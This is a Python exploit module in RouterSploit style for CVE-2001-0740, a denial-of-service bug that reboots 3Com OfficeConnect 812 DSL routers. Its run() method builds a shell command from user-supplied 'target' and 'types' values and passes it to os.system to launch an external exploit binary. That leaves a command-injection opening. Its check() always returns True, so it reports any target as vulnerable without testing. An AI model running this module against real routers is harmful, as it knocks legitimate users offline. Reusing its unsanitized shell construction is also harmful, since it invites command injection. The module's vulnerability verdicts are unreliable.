
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2001-0740",

        "description": "OfficeConnect 812 is a DSL router manufactured by 3Com, and distributed by numerous DSL providers. OfficeConnect 812  "
                       "is an integrated ADSL router with an onboard 4 port switch.A problem in the firmware included with this router could  "
                       "allow a Denial of Service. It is possible to reboot the router by connecting to the HTTP daemon, and requesting a long "
                       "string. The router will power-cycle itself.This problem makes it possible for a remote user to deny service to legimate "
                       " users of networks serviced by the router.",

        "authors": (

            "Sniffer",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20847",

        ),

        "devices": (

            "3Com, CVE-2001-0740"
        ),
    }


    target = OptIP("", "remote router ip")
    types = OptString(""," 1.soft || 2.hard")
    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./{} {} {}".format("exploit-db-20847",self.types,self.target)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
